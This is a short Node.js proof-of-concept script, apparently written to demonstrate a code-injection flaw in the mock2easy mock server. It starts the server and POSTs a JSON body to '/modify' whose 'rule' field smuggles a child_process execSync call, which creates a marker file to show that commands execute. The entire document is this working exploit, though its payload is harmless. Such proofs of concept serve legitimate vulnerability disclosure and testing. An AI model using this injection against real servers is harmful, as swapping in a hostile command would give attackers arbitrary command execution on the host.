const request = require("request");
var mock2easy = require("mock2easy")("x","a", function(app) {
    app.listen(3000, function () {        
        console.log("request")
        request({
            url:'http://localhost:3000/modify',
            method: "POST",
            json: true,
            body: JSON.parse("{\"interfaceUrl\":\"/http\",\"requiredParameters\":[], \"responseParameters\":[{\"kind\":\"mock\",\"rule\":\"require(\'child_process\').execSync(\'touch mock2easy-success.txt\')\"}]}")
        }, function(error, response, body) {
            console.log(body);            
            process.exit(1)
        });                
    });
});